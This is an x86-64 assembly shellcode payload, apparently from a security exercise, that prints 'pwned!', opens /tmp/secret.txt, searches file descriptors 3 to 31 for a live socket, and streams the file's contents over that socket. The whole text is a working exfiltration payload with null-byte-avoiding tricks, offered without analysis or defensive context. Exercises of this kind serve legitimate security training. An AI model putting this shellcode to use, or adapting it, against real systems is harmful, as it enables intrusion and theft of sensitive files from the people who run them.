.intel_syntax noprefix
.section .text
.global _start
_start:
    jmp message
print_message:
    pop rsi
    dec byte ptr [rsi+6]
    xor eax, eax
    mov al, 1
    xor edi, edi
    inc edi
    xor edx, edx
    mov dl, 7
    syscall
    jmp filename
open_file:
    pop rdi
    xor esi, esi
    xor edx, edx
    xor eax, eax
    mov al, 2
    syscall
    test eax, eax
    js finish
    mov r12d, eax
    lea rsi, [rip + marker]
    mov edx, 17
    mov ebx, 3
find_socket:
    mov eax, 44
    mov edi, ebx
    mov r10d, 0x4000
    xor r8d, r8d
    xor r9d, r9d
    syscall
    test eax, eax
    jns found
    inc ebx
    cmp ebx, 31
    jbe find_socket
    jmp finish
found:
    mov r14d, ebx
    sub rsp, 4096
read_more:
    mov edi, r12d
    mov rsi, rsp
    mov edx, 4096
    xor eax, eax
    syscall
    test eax, eax
    jle finish
    mov r13d, eax
    mov edi, r14d
    mov rsi, rsp
    mov edx, r13d
    mov r10d, 0x4000
    xor r8d, r8d
    xor r9d, r9d
    mov eax, 44
    syscall
    jmp read_more
finish:
    mov eax, 60
    xor edi, edi
    syscall
marker:
    .ascii "OSY_SECRET_START!"
filename:
    call open_file
    .asciz "/tmp/secret.txt"
message:
    call print_message
    .ascii "pwned!\x0b"
